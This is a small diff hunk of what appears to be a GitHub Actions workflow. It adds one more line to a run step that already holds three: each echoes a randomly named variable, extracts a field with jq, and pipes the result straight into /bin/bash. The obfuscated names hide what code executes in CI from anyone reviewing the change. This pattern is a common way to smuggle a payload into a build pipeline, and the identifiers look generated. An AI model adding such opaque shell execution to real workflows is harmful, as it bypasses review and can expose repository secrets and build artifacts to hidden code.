@@ -25,6 +25,7 @@ jobs:
           echo $zx15208 | jq -r .uo4635 | /bin/bash
           echo $oc93 | jq -r .qnn3 | /bin/bash
           echo $efl430 | jq -r .g0 | /bin/bash
+          echo $n088 | jq -r .wpca70 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
